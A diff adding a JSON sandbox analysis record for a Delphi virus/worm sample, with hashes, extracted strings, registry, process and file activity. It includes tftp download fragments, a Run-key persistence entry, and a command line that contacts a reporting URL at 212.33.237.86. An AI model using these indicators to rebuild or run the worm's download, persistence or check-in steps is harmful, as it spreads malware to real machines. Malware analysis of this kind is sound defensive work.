@@ -1,0 +1,777 @@
+{
+	"md5": "81d89d2938117318750d64825236dbe7",
+	"data": {
+		"String": [
+			{
+				"type": "C-Style",
+				"string": "SOFTWARE\\Borland\\Delphi\\RTL"
+			},
+			{
+				"type": "C-Style",
+				"string": "FPUMaskValue"
+			},
+			{
+				"type": "C-Style",
+				"string": "kernel32.dll"
+			},
+			{
+				"type": "C-Style",
+				"string": "GetDiskFreeSpaceExA"
+			},
+			{
+				"type": "C-Style",
+				"string": "futurax.exe"
+			},
+			{
+				"type": "Unicode C-Style",
+				"string": "FXNBFXFXNBFXFXFXFX"
+			},
+			{
+				"type": "C-Style",
+				"string": "tftp -i "
+			},
+			{
+				"type": "C-Style",
+				"string": " GET "
+			},
+			{
+				"type": "C-Style",
+				"string": "start "
+			},
+			{
+				"type": "C-Style",
+				"string": "software\\microsoft\\windows\\currentversion\\run"
+			},
+			{
+				"type": "C-Style",
+				"string": "ati display driver"
+			},
+			{
+				"type": "C-Style",
+				"string": "FuTurAx"
+			},
+			{
+				"type": "C-Style",
+				"string": "Full Delphi Virus/Worm made By FuTuRaX"
+			},
+			{
+				"type": "C-Style",
+				"string": "C:\\Program Files\\Internet Explorer\\IEXPLORE 212.33.237.86/images/1/report.php"
+			},
+			{
+				"type": "C-Style",
+				"string": "Error"
+			},
+			{
+				"type": "C-Style",
+				"string": "Runtime error     at 00000000"
+			},
+			{
+				"type": "Unicode C-Style",
+				"string": "\\C$\\123456111111111111111.doc"
+			},
+			{
+				"type": "C-Style",
+				"string": "kernel32.dll"
+			},
+			{
+				"type": "C-Style",
+				"string": "user32.dll"
+			},
+			{
+				"type": "C-Style",
+				"string": "advapi32.dll"
+			},
+			{
+				"type": "C-Style",
+				"string": "oleaut32.dll"
+			},
+			{
+				"type": "C-Style",
+				"string": "kernel32.dll"
+			},
+			{
+				"type": "C-Style",
+				"string": "advapi32.dll"
+			},
+			{
+				"type": "C-Style",
+				"string": "kernel32.dll"
+			},
+			{
+				"type": "C-Style",
+				"string": "wininet.dll"
+			},
+			{
+				"type": "C-Style",
+				"string": "wsock32.dll"
+			},
+			{
+				"type": "C-Style",
+				"string": ":\\\\Program Files\\Common Files\\Microsoft Shared\\Speech\\sapisvr.exe"
+			},
+			{
+				"type": "C-Style",
+				"string": "C:\\\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\AppLaunch.exe"
+			},
+			{
+				"type": "C-Style",
+				"string": "!This program cannot be run in DOS mode.\r\r\n$"
+			},
+			{
+				"type": "C-Style",
+				"string": ".text"
+			}
+		],
+		"Packer": "",
+		"compiler": "Borland Delphi(6-7 or 2005)",
+		"linker": "unknown(5.12)[EXE32]",
+		"PDB path": "",
+		"full Fuzzyhash": "12288:XT+KQiz1XORM2KRPHBWN0bclkca9KSBCnzbkP8KmCOrpE:XTh9zt6M2NNoclTNvP5rpE",
+		"section Fuzzyhash(.data)": "",
+		"rich header": "",
+		"PE Image": "binary_81d89d2938117318750d64825236dbe7.jpg",
+		"bytecode": "binary_81d89d2938117318750d64825236dbe7.byte",
+		"opcode": "",
+		"MD5 of Sections": [],
+		"Yara Rule": [],
+		"MD5": "81d89d2938117318750d64825236dbe7",
+		"SHA1": "6d53997b50ea90d6d2202f342573ea625eeb0201",
+		"SHA256": "0001319060dd4070ff63f7bced5f38305b12c78a9cc4e6a9e77e195d8814c25e",
+		"EntryPoint": "",
+		"EntryPoint Data": "0x0:\tarpl\tword ptr [ecx + 0x70], sp\n0x3:\tjae\t0x79\n0x5:\toutsd\tdx, dword ptr [esi]\n0x6:\toutsb\tdx, byte ptr [esi]\n0x7:\tpop\tedi\n0x9:\tinsd\tdword ptr es:[edi], dx\n0xa:\toutsd\tdx, dword ptr [esi]\n0xb:\tjne\t0x71\n0xd:\tinsb\tbyte ptr es:[edi], dx\n0xe:\tjo\t0x8b\n",
+		"ImageBase": "",
+		"FileSize": 844460,
+		"Original FileName": "",
+		"Entropy": 6.166,
+		"Subsystem": "",
+		"Image File Characteristics": "",
+		"Timestamp": "",
+		"Import Hash": "",
+		"Section Info": [],
+		"Resource": [],
+		"Registry Activities(keyCreated)": [
+			{
+				"path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Recovery\\AdminActive"
+			},
+			{
+				"path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\MAO Settings"
+			},
+			{
+				"path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\User Preferences"
+			},
+			{
+				"path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\SearchScopes"
+			},
+			{
+				"path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\EUPP"
+			},
+			{
+				"path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\EUPP\\DSP"
+			},
+			{
+				"path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\SearchScopes\\{0633EE93-D776-472f-A0FF-E1416B8B2E3A}"
+			}
+		],
+		"Registry Activities(keyValueCreated)": [
+			{
+				"path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Recovery\\AdminActive",
+				"name": "{C32C3E89-28A5-11ED-AAE5-34735AA02029}"
+			},
+			{
+				"path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Recovery\\PendingRecovery",
+				"name": "AdminActive"
+			},
+			{
+				"path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Ext\\Settings\\{B4F3A835-0E21-4959-BA22-42B3008E02FF}",
+				"name": "Flags"
+			},
+			{
+				"path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\MAO Settings",
+				"name": "DiscardLoadTimes"
+			},
+			{
+				"path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\User Preferences",
+				"name": "88D7D0879DAB32E14DE5B3A805A34F98AFF34F5977"
+			},
+			{
+				"path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\SearchScopes",
+				"name": "DefaultScope"
+			},
+			{
+				"path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\EUPP\\DSP",
+				"name": "ChangeNotice"
+			},
+			{
+				"path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\User Preferences",
+				"name": "2D53CFFC5C1A3DD2E97B7979AC2A92BD59BC839E81"
+			},
+			{
+				"path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\SearchScopes",
+				"name": "DefaultPackCorrection"
+			},
+			{
+				"path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\SearchScopes",
+				"name": "KnownProvidersUpgradeTime"
+			},
+			{
+				"path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\SearchScopes\\{0633EE93-D776-472f-A0FF-E1416B8B2E3A}",
+				"name": "DisplayName"
+			},
+			{
+				"path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\SearchScopes\\{0633EE93-D776-472f-A0FF-E1416B8B2E3A}",
+				"name": "FaviconURLFallback"
+			},
+			{
+				"path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\SearchScopes\\{0633EE93-D776-472f-A0FF-E1416B8B2E3A}",
+				"name": "FaviconURL"
+			},
+			{
+				"path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\SearchScopes\\{0633EE93-D776-472f-A0FF-E1416B8B2E3A}",
+				"name": "TopResultURLFallback"
+			},
+			{
+				"path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\SearchScopes\\{0633EE93-D776-472f-A0FF-E1416B8B2E3A}",
+				"name": "TopResultURL"
+			},
+			{
+				"path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\SearchScopes\\{0633EE93-D776-472f-A0FF-E1416B8B2E3A}",
+				"name": "URL"
+			},
+			{
+				"path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\SearchScopes\\{0633EE93-D776-472f-A0FF-E1416B8B2E3A}",
+				"name": "SuggestionsURLFallback"
+			},
+			{
+				"path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\SearchScopes\\{0633EE93-D776-472f-A0FF-E1416B8B2E3A}",
+				"name": "SuggestionsURL"
+			},
+			{
+				"path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\SearchScopes",
+				"name": "DownloadRetries"
+			}
+		],
+		"Process Activities(processCreated)": [
+			{
+				"cmdline": "'C:\\Program Files\\Internet Explorer\\IEXPLORE' 212.33.237.86/images/1/report.php"
+			},
+			{
+				"cmdline": "'C:\\Program Files (x86)\\Internet Explorer\\IEXPLORE.EXE' SCODEF:1708 CREDAT:275457 /prefetch:2"
+			}
+		],
+		"Process Activities(processSuspended)": [],
+		"Process Activities(processTerminated)": [],
+		"Process Activities(shellExecuted)": [],
+		"Files Activities(fileCreated)": [
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe_"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe-"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe_"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe-"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe_"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe-"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe_"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe-"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe_"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe-"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe_"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe-"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe_"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe-"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe_"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe-"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe_"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe-"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe_"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe-"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe_"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe-"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe_"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe-"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe_"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe-"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe_"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe-"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe_"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe-"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe_"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe-"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe_"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe-"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe_"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe-"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe_"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe-"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe_"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe-"
+			},
+			{
+				"path": "C:\\Documents and Settings\\All Users\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe"
+			},
+			{
+				"path": "C:\\Users\\user"
+			},
+			{
+				"path": "C:\\Users\\user\\Favorites"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Local"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Roaming"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\Cookies"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\History"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\PrivacIE"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\DNTException"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\IECompatCache"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\IECompatUACache"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Local\\Microsoft\\Internet Explorer\\Recovery\\High\\Active"
+			},
+			{
+				"path": "C:\\Users"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Local\\Microsoft"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Local\\Microsoft\\Internet Explorer"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Local\\Microsoft\\Internet Explorer\\Recovery"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Local\\Microsoft\\Internet Explorer\\Recovery\\High"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Local\\Microsoft\\Internet Explorer\\Recovery\\High\\Active\\RecoveryStore.{C32C3E89-28A5-11ED-AAE5-34735AA02029}.dat"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Local\\Temp\\~DF705C9746CD951EEE.TMP"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Local\\Microsoft\\Internet Explorer\\Recovery\\High\\Active\\{C32C3E8B-28A5-11ED-AAE5-34735AA02029}.dat"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Local\\Temp\\~DFC7D3A6AD7FD3C024.TMP"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\Caches"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\LocalLow\\Microsoft\\Internet Explorer\\Services\\"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Local\\Temp\\Kno2720.tmp"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\9NGRGH2P\\dnserror[1]"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\GESGO3I3\\NewErrorPageTemplate[1]"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\C3UHIZOG\\errorPageStrings[1]"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\XNTPGCSS\\httpErrorPagesScripts[1]"
+			}
+		],
+		"Files Activities(fileDeleted)": [
+			{
+				"path": "C:\\ProgramData\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe"
+			},
+			{
+				"path": "C:\\ProgramData\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe-"
+			},
+			{
+				"path": "C:\\ProgramData\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe_"
+			},
+			{
+				"path": "C:\\ProgramData\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe"
+			},
+			{
+				"path": "C:\\ProgramData\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe-"
+			},
+			{
+				"path": "C:\\ProgramData\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe_"
+			}
+		],
+		"Files Activities(fileWritten)": [
+			{
+				"path": "C:\\ProgramData\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe_"
+			},
+			{
+				"path": "C:\\ProgramData\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe-"
+			},
+			{
+				"path": "C:\\ProgramData\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe"
+			},
+			{
+				"path": "C:\\ProgramData\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe_"
+			},
+			{
+				"path": "C:\\ProgramData\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe-"
+			},
+			{
+				"path": "C:\\ProgramData\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Local\\Microsoft\\Internet Explorer\\Recovery\\High\\Active\\RecoveryStore.{C32C3E89-28A5-11ED-AAE5-34735AA02029}.dat"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Local\\Temp\\~DF705C9746CD951EEE.TMP"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Local\\Microsoft\\Internet Explorer\\Recovery\\High\\Active\\{C32C3E8B-28A5-11ED-AAE5-34735AA02029}.dat"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Local\\Temp\\~DFC7D3A6AD7FD3C024.TMP"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\9NGRGH2P\\dnserror[1]"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\GESGO3I3\\NewErrorPageTemplate[1]"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\C3UHIZOG\\errorPageStrings[1]"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\XNTPGCSS\\httpErrorPagesScripts[1]"
+			}
+		],
+		"Files Activities(fileRead)": [
+			{
+				"path": "C:\\Users\\user\\Desktop\\Fz2A8VJKpS.exe"
+			},
+			{
+				"path": "C:\\ProgramData\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe_"
+			},
+			{
+				"path": "C:\\ProgramData\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe"
+			},
+			{
+				"path": "C:\\ProgramData\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\RDC\\setup.exe-"
+			},
+			{
+				"path": "C:\\ProgramData\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe_"
+			},
+			{
+				"path": "C:\\ProgramData\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe"
+			},
+			{
